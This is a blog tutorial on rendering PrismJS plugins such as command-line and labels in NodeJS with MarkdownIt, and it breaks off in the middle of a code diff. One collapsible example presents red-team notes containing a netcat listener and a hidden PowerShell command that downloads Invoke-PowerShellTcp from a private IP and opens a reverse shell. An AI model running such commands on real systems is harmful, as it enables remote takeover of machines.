<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>How to Use PrismJS Plugins with NodeJS and MarkdownIt - TrebledJ's Pages</title><meta name="description" content="Improve your storytelling with these dead simple hacks for rendering fancy Prism plugins in Node!"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="trebledj,how to use prismjs plugins with nodejs and markdownit,improve your storytelling with these dead simple hacks for rendering fancy prism plugins in node!,programming,web,js,tutorial,meta,performance"><meta name="robots" content="index,follow"><meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'sha256-Wv9Tjjg7Y7X5sBbP5AXqAQJA6+eewSRUjoPhNczfpnM=' 'sha256-FBtdNYnNdsvTKcrNIznI+jwGwhW3pNA5x/yQUw8jOPA=' 'sha256-5e8R4YC3Atf/5McNMkFk4TZYUtMEItdy9ikt1KUoPSc=' 'sha256-qlkNkQyGC5u9Brt4wwVi0MsPO/hVdrz3rzXuWYIkAbM=' 'sha256-J+ryCgKrW+QOH4xdCyPd6R5W3u9wJkXayR7KvtlnCnQ=' 'sha256-Deekn20h+++EarpL0nFQLX7JSJv7s/2W9f988ZFAh14=' comments.trebledj.me code.jquery.com cdn.jsdelivr.net gist.github.com static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' comments.trebledj.me cdn.jsdelivr.net cdnjs.cloudflare.com github.githubassets.com; font-src 'self' data: comments.trebledj.me cdn.jsdelivr.net cdnjs.cloudflare.com; img-src 'self' data: comments.trebledj.me; frame-src 'self' *.soundcloud.com; connect-src 'self' comments.trebledj.me wss://comments.trebledj.me cloudflareinsights.com formcarry.com;"><link href="/feeds/posts.xml" rel="alternate" title="RSS Feed for TrebledJ's Pages" type="application/rss+xml"><meta property="og:site_name" content="TrebledJ's Pages"><meta property="og:type" content="article"><meta property="og:title" content="How to Use PrismJS Plugins with NodeJS and MarkdownIt - TrebledJ's Pages"><meta property="twitter:title" content="How to Use PrismJS Plugins with NodeJS and MarkdownIt - TrebledJ's Pages"><meta property="og:description" content="Improve your storytelling with these dead simple hacks for rendering fancy Prism plugins in Node!

With over 7 million weekly downloads on NPM, PrismJS is one of the most widely used code highlighting packages in JavaScript, lauded for its unparalleled extensibility through plugins. But one..."><meta property="twitter:description" content="Improve your storytelling with these dead simple hacks for rendering fancy Prism plugins in Node!

With over 7 million weekly downloads on NPM, PrismJS is one of the most widely used code highlighting packages in JavaScript, lauded for its unparalleled extensibility through plugins. But one..."><meta property="og:url" content="https://trebledj.me/posts/prism-plugins-in-node/"><meta name="twitter:card" content="summary_large_image"><meta property="og:image" content="https://trebledj.me/img/posts/programming/mini-projects/prism-plugins-in-node/assets/thumbnail-1024w.webp"><meta property="twitter:image" content="https://trebledj.me/img/posts/programming/mini-projects/prism-plugins-in-node/assets/thumbnail-1024w.webp"><meta property="article:published_time" content="2024-11-03T00:00:00.000Z"><meta property="article:author" content="TrebledJ"><meta property="article:section" content="programming"><meta property="article:tag" content="programming"><meta property="article:tag" content="web"><meta property="article:tag" content="js"><meta property="article:tag" content="tutorial"><meta property="article:tag" content="meta"><meta property="article:tag" content="performance"><script type="application/ld+json">{"@context": "https://schema.org","@type": "WebSite","name": "TrebledJ's Pages","url": "https://trebledj.me"}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/cb/css/icons-6e60ae6c5e022aba.css"><link rel="stylesheet" href="/cb/x2ljFSZBUH.css" media="print"><style></style><script>document.querySelectorAll('link[media|="print"]').forEach(e=>{e.addEventListener("load",()=>e.media="all"),e.sheet&&(e.media="all")})</script><script>const defaultTheme="dark";let icon=void 0;var reloadDisqus=void 0;function modeInit(){var e=localStorage.getItem("theme");setMode("dark"===e?"dark":"light"===e?"light":defaultTheme)}function modeInitIcon(){icon=document.getElementById("mode-switch-icon"),isLightTheme()&&(icon.classList.remove("fa-moon"),icon.classList.add("fa-sun"),icon.classList.add("mode-switch-transform"))}function isLightTheme(){return"light"===localStorage.getItem("theme")}function modeSwitcher(){var e=localStorage.getItem("theme");"dark"===e?(setMode("light"),reloadDisqus&&reloadDisqus()):"light"===e?(setMode("dark"),reloadDisqus&&reloadDisqus()):setMode(defaultTheme)}function setMode(e){"dark"===e?(document.documentElement.setAttribute("data-theme","dark"),localStorage.setItem("theme","dark")):"light"===e&&(document.documentElement.setAttribute("data-theme","light"),localStorage.setItem("theme","light")),icon&&(icon.classList.toggle("fa-moon"),icon.classList.toggle("fa-sun"),icon.classList.toggle("mode-switch-transform"))}modeInit(),document.addEventListener("DOMContentLoaded",()=>{document.getElementById("mode-switch").addEventListener("click",()=>{modeSwitcher()})})</script><script defer src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><link rel="stylesheet" href="/css/comments.css"><link rel="icon" href="/favicon.ico" type="image/x-icon"></head><body><header><nav class="navbar navbar-expand-md py-2"><div class="container-fluid justify-content-between align-items-center"><button aria-controls="navbar-container" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler shadow-none" data-bs-target="#navbar-container" data-bs-toggle="collapse" type="button"><span id="navbar-toggler-icon"><i class="fas fa-bars"></i></span></button> <a class="navbar-brand no-decoration" href="/">TrebledJ's Pages</a><div class="navbar-collapse collapse" id="navbar-container"><ul class="navbar-nav me-auto"><li class="nav-item"><a class="nav-link" href="/">Home</a></li><li class="nav-item"><a class="nav-link" href="/about">About</a></li><li class="nav-item"><a class="nav-link" href="/posts">Posts</a></li><li class="nav-item"><a class="nav-link" href="/music">Music</a></li></ul><ul class="navbar-nav"><li><a class="nav-link me-2" data-bs-toggle="modal" data-bs-target="#search-modal" aria-label="Search..." role="button"><i class="fas fa-search nav-icon"></i></a></li><li><a class="nav-link" id="mode-switch" aria-label="Theme Switch" role="button"><i id="mode-switch-icon" class="fas fa-moon nav-icon"></i></a><script>modeInitIcon()</script></li></ul></div></div></nav><div id="scroll-progress-bar"></div></header><div id="top-of-the-morning-to-you"></div><div id="search-modal" class="modal fade wide-modal" aria-hidden="true" aria-label="Search" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header pb-2 d-flex flex-row justify-content-between"><div class="container-fluid ps-0" id="search-box-container"><input type="text" autofocus class="container-fluid" id="search-box" placeholder="Search"> <i class="fas fa-search"></i></div><button aria-label="Close" class="btn-close" data-bs-dismiss="modal" type="button"></button></div><div class="modal-body" id="search-results-list"></div></div></div></div><button id="btn-back-to-top" class="btn btn-lg" type="button" aria-label="Back to Top"><i class="fas fa-arrow-up"></i></button><div id="btn-mobile-toc" class="dropup"><button type="button" class="btn btn-lg" data-bs-toggle="dropdown" aria-label="Content"><i class="fas fa-list-ul"></i></button><ul class="dropdown-menu toc-container"><li><nav class="toc"><ol><li><a href="#why-enhance-codeblocks">Why enhance codeblocks?</a></li><li><a href="#step-1-expose-a-dom-api">Step 1: Expose a DOM API</a></li><li><a href="#step-2-override-markdownit-fence-rendering">Step 2: Override MarkdownIt Fence Rendering</a></li><li><a href="#step-3-use-markdown-it-attrs">Step 3: Use markdown-it-attrs</a></li><li><a href="#step-4-optional-modify-plugins">Step 4: (Optional) Modify Plugins</a></li><li><a href="#benchmarking-dom-libraries">Benchmarking DOM Libraries</a></li><li><a href="#final-remarks">Final Remarks</a></li></ol></nav></li></ul></div><div class="main-container"><div class="page-container col-lg-12"><div class="container-lg px-0"><article class="jw-100 post-article" itemscope itemtype="http://schema.org/BlogPosting"><div class="row flex-row-reverse gx-lg-5"><div class="col-lg-4 d-none d-lg-block"><div class="dim-deep"><div class="metadata-container d-flex"><div class="d-flex flex-row align-items-center"><span><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-posted-date">Posted on <span itemprop="datePublished" content="2024-11-03T08:00:00.000+08:00">2024‑11‑03</span></span></div><div class="d-flex flex-row align-items-center"><span class="post-updated-date-icon"><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-updated-date">Updated on <span itemprop="dateModified" content="2024-12-02T00:07:59.000+08:00">2024‑12‑01</span></span></div><div class="d-flex flex-row align-items-center"><span><i class="far fa-clock post-meta-icon me-1"></i> </span><span class="fs-7">7 minute read</span></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><span><i class="fas fa-tag post-meta-icon me-1 mt-2"></i></span><div class="tag-list d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a> </span><span><a class="jtag" href="/tags/js/" itemprop="keywords">js</a> </span><span><a class="jtag" href="/tags/tutorial/" itemprop="keywords">tutorial</a> </span><span><a class="jtag" href="/tags/meta/" itemprop="keywords">meta</a> </span><span><a class="jtag" href="/tags/performance/" itemprop="keywords">performance</a></span></div></div></div><br><div id="toc-sidebar" class="sticky-right dim-deep dim-if-dark"><div class="toc-container"><span><a id="toc-content" href="javascript:void(0);">Content</a></span><nav class="toc"><ol><li><a href="#why-enhance-codeblocks">Why enhance codeblocks?</a></li><li><a href="#step-1-expose-a-dom-api">Step 1: Expose a DOM API</a></li><li><a href="#step-2-override-markdownit-fence-rendering">Step 2: Override MarkdownIt Fence Rendering</a></li><li><a href="#step-3-use-markdown-it-attrs">Step 3: Use markdown-it-attrs</a></li><li><a href="#step-4-optional-modify-plugins">Step 4: (Optional) Modify Plugins</a></li><li><a href="#benchmarking-dom-libraries">Benchmarking DOM Libraries</a></li><li><a href="#final-remarks">Final Remarks</a></li></ol></nav><hr></div><div class="toc-link-container"><span><a href="#related">Related Posts</a></span></div><div class="toc-link-container"><span><a href="#comments">Comments</a></span></div></div></div><div class="col-lg-8 post-body-container"><div class="article-header"><h1 class="post-title" itemprop="name headline">How to Use PrismJS Plugins with NodeJS and MarkdownIt</h1><p class="post-desc" itemprop="alternativeHeadline">Improve your storytelling with these dead simple hacks for rendering fancy Prism plugins in Node!</p><div class="d-lg-none dim-deep"><div class="metadata-container d-flex"><div class="d-flex flex-row align-items-center"><span><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-posted-date">Posted on <span itemprop="datePublished" content="2024-11-03T08:00:00.000+08:00">2024‑11‑03</span></span></div><div class="d-flex flex-row align-items-center"><span class="post-updated-date-icon"><i class="fas fa-calendar post-meta-icon me-1"></i> </span><span class="fs-7 post-updated-date">Updated on <span itemprop="dateModified" content="2024-12-02T00:07:59.000+08:00">2024‑12‑01</span></span></div><div class="d-flex flex-row align-items-center"><span><i class="far fa-clock post-meta-icon me-1"></i> </span><span class="fs-7">7 minute read</span></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><span><i class="fas fa-tag post-meta-icon me-1 mt-2"></i></span><div class="tag-list d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a> </span><span><a class="jtag" href="/tags/js/" itemprop="keywords">js</a> </span><span><a class="jtag" href="/tags/tutorial/" itemprop="keywords">tutorial</a> </span><span><a class="jtag" href="/tags/meta/" itemprop="keywords">meta</a> </span><span><a class="jtag" href="/tags/performance/" itemprop="keywords">performance</a></span></div></div></div></div><hr><div class="post-body text-content" itemprop="articleBody text"><p>With over 7 million weekly downloads on NPM, PrismJS is one of the most widely used code highlighting packages in JavaScript, lauded for its unparalleled extensibility through plugins. But one recurring issue plagues developers: most plugins require a <abbr data-bs-placement="top" data-bs-toggle="tooltip" title="document object model, responsible for managing the UI you see in your wonderful browser">DOM</abbr>! Fancy plugins such as <code>command-line</code>, <code>line-numbers</code>, and the toolbar suite require a DOM to manipulate HTML. This isn't normally possible in runtime environments such as Node, which aren't designed to render UIs, hence, no DOM.</p><p>In this post, I’ll demonstrate a few simple changes to easily coerce these plugins into compatibility with NodeJS and MarkdownIt, a popular markdown renderer.<sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup></p><h2 id="why-enhance-codeblocks" tabindex="-1"><a class="md-anchor" href="#why-enhance-codeblocks" aria-hidden="true"></a> Why enhance codeblocks?</h2><p>Simple codeblocks suffice for most writers who need supporting text with pretty colours. But maybe you want your codeblocks to simply look <em>flashier</em>. Or maybe you want better tools <em>to tell a story</em>!</p><p>To tell a good story, the characters, plot, and location need to be clear to the audience. Similarly, blog posts and tutorials benefit from enhancements such as command-line demarcations, line numbers, labels, and inline markup.</p><p>There are many cases where such codeblocks are warranted (brackets contain remedial plugins):</p><ul><li>Interaction: input and output should be contrasted, think: shell or Jupyter notebook (command-line)</li><li>A post compares or demonstrates a technique in multiple languages (show-language)</li><li>Code is executed in multiple, distinct environments (command-line, label)</li><li>A post refers to a code snippet within a large file (line-numbers)</li><li>A post refers to multiple files (label)</li></ul><details><summary>Example: Catching Reverse Shells (Labels and Command-Line)</summary><div class="details-content"><p>This is really useful when presenting narratives for red teaming scenarios, where multiple machines are involved.<sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup> Here are some simple notes on catching a reverse shell from a Windows machine.</p><ol><li><p><em>Get our IP.</em></p><div class="code-toolbar"><pre data-label="Attacker" class="command-line language-shell" data-prompt="kali@kali $" data-output="2-10" tabindex="0"><code class="language-shell"><span class="command-line-prompt"><span data-prompt="kali@kali $"></span><span></span><span></span><span></span></span><span class="token command"><span class="token function">ifconfig</span></span>
<span class="token output">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span>
<span class="token output">    inet 192.168.100.100  netmask 255.255.255.0  broadcast 192.168.100.255</span>
<span class="token output">    ...</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Attacker</span></div><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li><li><p><em>Listen for incoming connections on port 4444.</em></p><div class="code-toolbar"><pre data-label="Attacker" class="command-line language-shell" data-prompt="kali@kali $" tabindex="0"><code class="language-shell"><span class="command-line-prompt"><span data-prompt="kali@kali $"></span></span><span class="token command"><span class="token function">nc</span> <span class="token parameter variable">-nlvp</span> <span class="token number">4444</span></span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Attacker</span></div><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li><li><p><em>Download and execute <code>Invoke-PowerShellTcp</code> on the victim.</em></p><div class="code-toolbar"><pre data-label="Victim" class="command-line language-powershell" data-prompt="PS C:\>" tabindex="0"><code class="language-powershell"><span class="command-line-prompt"><span data-prompt="PS C:\>"></span></span><span class="token command">powershell <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"iex (New-Object Net.WebClient).DownloadString('http://192.168.100.100/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.100.100 -Port 4444"</span> </span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Victim</span></div><div class="toolbar-item"><span class="lang">PowerShell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li></ol><p>It's clear that our character shifts from Scene 1 to Scene 2, with less sentence clutter.</p><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><p>Another problem I notice on many documentation pages is the use of <code>$</code>, denoting the start of a new command on a shell. These are poor for a couple reasons: it doesn't accurately present the actual code (from both the writer's and readers' PoV) and may disrupt syntax highlighters.</p><details><summary>Example: The Obstructive $ (Command-Line)</summary><div class="details-content"><p>These are commonly seen in installation scripts or guides. Here's an example installing a Makefile-based project:</p><div class="code-toolbar"><pre class="language-sh" tabindex="0"><code class="language-sh">$ <span class="token function">tar</span> <span class="token parameter variable">-xvzf</span> who_doesnt_like_to_copy_lines_of_code_one_by_one.tar.gz
$ <span class="token builtin class-name">cd</span> who_doesnt_like_to_copy_lines_of_code_one_by_one
$ ./configure
$ <span class="token function">make</span> <span class="token parameter variable">-j4</span>
$ <span class="token function">make</span> <span class="token function">install</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Atrocious! You can't copy multiple lines without the nasty $ getting in the way! What terrible UX. It's like when your parent or sibling stands in front of the television!<sup class="footnote-ref"><a href="#fn3" id="fnref3">3</a></sup></p><p>Compare it to this:</p><div class="code-toolbar"><pre class="command-line language-sh" data-prompt="$" tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span data-prompt="$"></span><span data-prompt="$"></span><span data-prompt="$"></span><span data-prompt="$"></span><span data-prompt="$"></span></span><span class="token command"><span class="token function">tar</span> <span class="token parameter variable">-xvzf</span> who_doesnt_like_to_copy_lines_of_code_one_by_one.tar.gz</span>
<span class="token command"><span class="token builtin class-name">cd</span> who_doesnt_like_to_copy_lines_of_code_one_by_one</span>
<span class="token command">./configure</span>
<span class="token command"><span class="token function">make</span> <span class="token parameter variable">-j4</span></span>
<span class="token command"><span class="token function">make</span> <span class="token function">install</span></span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="details-collapse-bottom"><sub><a class="details-collapse-button">(collapse)</a></sub></div></div></details><p>With that small rant out of the way, let's begin!</p><h2 id="step-1-expose-a-dom-api" tabindex="-1"><a class="md-anchor" href="#step-1-expose-a-dom-api" aria-hidden="true"></a> Step 1: Expose a DOM API</h2><p>To make Node seem like a browser, we want to introduce <code>document</code> and <code>window</code> globals. These are the two keys variables used by Prism to manipulate HTML. <code>window</code> isn't really called; it's mostly for UI behaviour. <code>document</code>, however, is used rather heavily.</p><div class="alert alert-danger d-flex align-items-start"><i class="fas fa-radiation ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p>This could have adverse effects on libraries which use unified code for both browser and runtime environments. Introducing <code>document</code> and <code>window</code> <em>might</em> have unintended spillover effects... In most cases though, this shouldn't break anything.</p></div></div><p>The easiest solution is to glue a DOM manipulation library such as JSDOM or domino, and create global <code>window</code>/<code>document</code> variables. I’ve chosen to use <a href="https://www.npmjs.com/package/domino" rel="noreferrer" target="_blank">domino</a> since it renders codeblocks much faster than JSDOM, with zero additional dependencies.</p><div class="code-toolbar"><pre class="language-sh" tabindex="0"><code class="language-sh"><span class="token function">npm</span> <span class="token function">install</span> domino</code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="code-toolbar"><pre class="language-js" tabindex="0"><code class="language-js"><span class="token keyword">const</span> domino <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'domino'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
global<span class="token punctuation">.</span>window <span class="token operator">=</span> domino<span class="token punctuation">.</span><span class="token function">createWindow</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
global<span class="token punctuation">.</span>getComputedStyle <span class="token operator">=</span> global<span class="token punctuation">.</span>window<span class="token punctuation">.</span>getComputedStyle<span class="token punctuation">;</span>
global<span class="token punctuation">.</span>document <span class="token operator">=</span> global<span class="token punctuation">.</span>window<span class="token punctuation">.</span>document<span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">JavaScript</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>NodeJS's <code>global</code> object enables us to add global variables. Now Prism can access our <code>window</code> and <code>document</code> globals.</p><p>For convenience later, we’ll also create a function which converts HTML strings to DOM objects. We'll use the <code>template</code> element to achieve this.<sup class="footnote-ref"><a href="#fn4" id="fnref4">4</a></sup></p><div class="code-toolbar"><pre class="language-js" tabindex="0"><code class="language-js"><span class="token keyword">function</span> <span class="token function">textToDOM</span><span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> templ <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'template'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  templ<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">;</span>
  <span class="token keyword">return</span> templ<span class="token punctuation">.</span>content<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">JavaScript</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h2 id="step-2-override-markdownit-fence-rendering" tabindex="-1"><a class="md-anchor" href="#step-2-override-markdownit-fence-rendering" aria-hidden="true"></a> Step 2: Override MarkdownIt Fence Rendering</h2><p>While MarkdownIt works great out-of-the-box, the default <abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Rendering is the process of convert raw code to a presentable HTML format.">rendering</abbr> rules for code blocks are inherently incompatible with most Prism plugins. MarkdownIt's renderer passes text as input to an arbitrary highlight function, but Prism’s full-featured highlighting expects a DOM Element node. They don't speak the same language!</p><p>Prism has two primary highlight functions: <code>Prism.highlight</code> and <code>Prism.highlightElement</code>. Most server-side libraries are happy to use the former. But a lot of <em>hooks</em> aren't called by <code>.highlight</code>, so we'll also have to customise the renderer to call <code>.highlightElement</code>.</p><p>We'll reference <a href="https://github.com/markdown-it/markdown-it/blob/0fe7ccb4b7f30236fb05f623be6924961d296d3d/lib/renderer.mjs#L29" rel="noreferrer" target="_blank">MarkdownIt's default fence rule</a> and customise it accordingly.</p><div class="alert alert-danger d-flex align-items-start"><i class="fas fa-radiation ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p>The code presented below will override the <code>.renderer.rules.fence</code> rule completely, overwriting any previous implementations.</p><p>If you use another plugin which reuses the fence rule (e.g. <code>markdown-it-prism</code>), consider calling code in this order: 1) the below fence-override code, 2) other code. This way no code is overwritten and lost.</p></div></div><p>Here are the changes we'll make:</p><ol><li>Remove the default text-based highlighting <code>options.highlight</code>. We still need to escape the HTML because we'll substitute it in a HTML string.</li><li>(Optional, if you want <code>diff</code> support.) Handle <code>diff-*</code> languages by loading the right language.</li><li>Wrap the escaped code in <code>&lt;div&gt;&lt;pre&gt;&lt;code&gt;</code> with the right attributes<sup class="footnote-ref"><a href="#fn5" id="fnref5">5</a></sup>, convert it to a DOM element, highlight it to <code>Prism.highlightElement</code>, then return the rendered HTML.</li><li>We also moved the attributes to <code>&lt;pre&gt;</code> instead of <code>&lt;code&gt;</code>, which is required for PrismJS to function properly.</li></ol><p>The most important part is step 3, where we call Prism magic with <code>.highlightElement</code>.</p><div class="code-toolbar"><pre data-diff="" class="language-diff-js language-js" tabindex="0"><code class="language-diff-js language-js"><span class="token unchanged language-js"><span class="token prefix unchanged"> </span>markdownit<span class="token punctuation">.</span>renderer<span class="token punctuation">.</span>rules<span class="token punctuation">.</span><span class="token function-variable function">fence</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">tokens<span class="token punctuation">,</span> idx<span class="token punctuation">,</span> options<span class="token punctuation">,</span> _env<span class="token punctuation">,</span> slf</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token prefix unchanged"> </span>  <span class="token operator">...</span>
</span><span class="token inserted-sign inserted language-js"><span class="token prefix inserted">+</span>  <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div&gt;&lt;pre</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>preAttrs<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&gt;&lt;code class="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>codeClasses<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>escaped<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</span><span class="token template-punctuation string">`</span></span>
<span class="token prefix inserted">+</span>  <span class="token keyword">const</span> el <span class="token operator">=</span> <span class="token function">textToDOM</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
<span class="token prefix inserted">+</span>  Prism<span class="token punctuation">.</span><span class="token function">highlightElement</span><span class="token punctuation">(</span>el<span class="token punctuation">.</span>firstChild<span class="token punctuation">.</span>firstChild<span class="token punctuation">.</span>firstChild<span class="token punctuation">)</span>
<span class="token prefix inserted">+</span>  <span class="token keyword">return</span> el<span class="token punctuation">.</span>firstChild<span class="token punctuation">.</span>firstChild<span class="token punctuation">.</span>outerHTML
</span><span class="token unchanged language-js"><span class="token prefix unchanged"> </span>  <span class="token operator">...</span>
<span class="token prefix unchanged"> </span><span class="token punctuation">}</span></span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">JavaScript</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><details><summary>See Full Changes</summary><div class="details-content"><div class="code-toolbar"><pre data-diff="" class="language-diff-js language-js" tabindex="0"><code class="language-diff-js language-js"><span class="token unchanged language-js"><span class="token prefix unchanged"> </span>markdownit<span class="token punctuation">.</span>renderer<span class="token punctuation">.</span>rules<span class="token punctuation">.</span><span class="token function-variable function">fence</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">tokens<span class="token punctuation">,</span> idx<span class="token punctuation">,</span> options<span class="token punctuation">,</span> _env<span class="token punctuation">,</span> slf</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token prefix unchanged"> </span>  <span class="token keyword">const</span> token <span class="token operator">=</span> tokens<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token prefix unchanged"> </span>  <span class="token keyword">const</span> info <span class="token operator">=</span> token<span class="token punctuation">.</span>info <span class="token operator">?</span> <span class="token function">unescapeAll</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>info<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">;</span>
<span class="token prefix unchanged"> </span>  <span class="token operator">...</span>
<span class="token prefix unchanged"> </span>
</span><span class="token deleted-sign deleted language-js"><span class="token prefix deleted">-</span>  <span class="token keyword">let</span> highlighted
<span class="token prefix deleted">-</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>highlight<span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token prefix deleted">-</span>    highlighted <span class="token operator">=</span> options<span class="token punctuation">.</span><span class="token function">highlight</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>content<span class="token punctuation">,</span> langName<span class="token punctuation">,</span> langAttrs<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
<span class="token prefix deleted">-</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
<span class="token prefix deleted">-</span>    highlighted <span class="token operator">=</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>content<span class="token punctuation">)</span>
<span class="token prefix deleted">-</span>  <span class="token punctuation">}</span>
</span><span class="token inserted-sign inserted language-js"><span class="token prefix inserted">+</span>  <span class="token keyword">const</span> escaped <span class="token operator">=</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>content<span class="token punctuation">)</span> <span class="token comment">// 1</span>
</span><span class="token unchanged language-js"><span class="token prefix unchanged"> </span>
</span><span class="token deleted-sign deleted language-js"><span class="token prefix deleted">-</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>highlighted<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'&lt;pre'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token prefix deleted">-</span>    <span class="token keyword">return</span> highlighted <span class="token operator">+</span> <span class="token string">'\n'</span>
<span class="token prefix deleted">-</span>  <span class="token punctuation">}</span>
</span><span class="token unchanged language-js"><span class="token prefix unchanged"> </span>
<span class="token prefix unchanged"> </span>  <span class="token comment">// If language exists, inject class gently, without modifying original token.</span>
<span class="token prefix unchanged"> </span>  <span class="token comment">// May be, one day we will add .deepClone() for token and simplify this part, but</span>
<span class="token prefix unchanged"> </span>  <span class="token comment">// now we prefer to keep things local.</span>
<span class="token prefix unchanged"> </span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>info<span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token prefix unchanged"> </span>    <span class="token keyword">const</span> i <span class="token operator">=</span> token<span class="token punctuation">.</span><span class="token function">attrIndex</span><span class="token punctuation">(</span><span class="token string">'class'</span><span class="token punctuation">)</span>
<span class="token prefix unchanged"> </span>    <span class="token keyword">const</span> tmpAttrs <span class="token operator">=</span> token<span class="token punctuation">.</span>attrs <span class="token operator">?</span> token<span class="token punctuation">.</span>attrs<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
